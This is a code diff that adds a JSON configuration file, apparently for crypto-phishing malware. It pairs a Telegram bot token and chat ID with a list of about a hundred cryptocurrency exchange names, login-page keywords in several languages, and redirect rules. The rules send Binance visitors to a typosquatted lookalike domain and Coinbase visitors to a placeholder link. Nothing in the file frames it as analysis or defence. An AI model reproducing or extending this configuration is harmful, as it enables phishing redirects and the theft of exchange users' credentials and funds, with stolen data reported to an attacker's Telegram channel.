@@ -1,0 +1,30 @@
+{
+  "botToken": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
+  "chatId": "8025121083",
+  "keywords": [
+    "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
+    "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
+    "BKEX","Bithumb","Bithumb Global","BitoPro","Binance","Binance US","Binance TR","BTC-Alpha","BTCC",
+    "Bullish","Brasil Bitcoin","CEX.IO","CEX","Changelly Pro","Coinbase","Coinall","Coincheck","CoinDCX",
+    "Coindeal","CoinEx","CoinFLEX","Coinhub","CoinTiger","Coinut","CoinW","Coinsbit","Crypto.com","Deepcoin",
+    "Deribit","Dcoin","DigiFinex","Exmo","FEX","FMFW.io","Gate.io","Gate","Gemini","GOKO","GoMining","HitBTC",
+    "Hotbit","Hotcoin","HTX","Huobi","Huobi Japan","Huobi Korea","Indodax","Koinbazar","Korbit","Kraken","KuCoin",
+    "LATOKEN","LBank","Liquid","Mandala Exchange","MAX Exchange","Mercado Bitcoin","MEXC","Nicehash","Nexo",
+    "Nominex","OceanEx","OKCoin","OKX","Paribu","Phemex","Poloniex","ProBit Global","SFOX","SimpleSwap","STEX",
+    "SuperEx","Tapbit","Toobit","Tokocrypto","Uniswap","Upbit","UPB","VCC Exchange","WazirX","WhiteBIT","XT.COM",
+    "Zaif","Zebpay","ZBG","ZB.com","ZenGo"
+  ],
+  "loginKeywords": [
+    "login", "loguin", "sign in", "entrar"
+  ],
+  "redirectRules": [
+    {
+      "regex": "binance\\.(com|us)",
+      "url": "https://blinnance.signln-plaform.co/?token=0x_full"
+    },
+    {
+      "regex": "coinbase\\.com",
+      "url": "https://seuoutrolink.com"
+    }
+  ]
+}
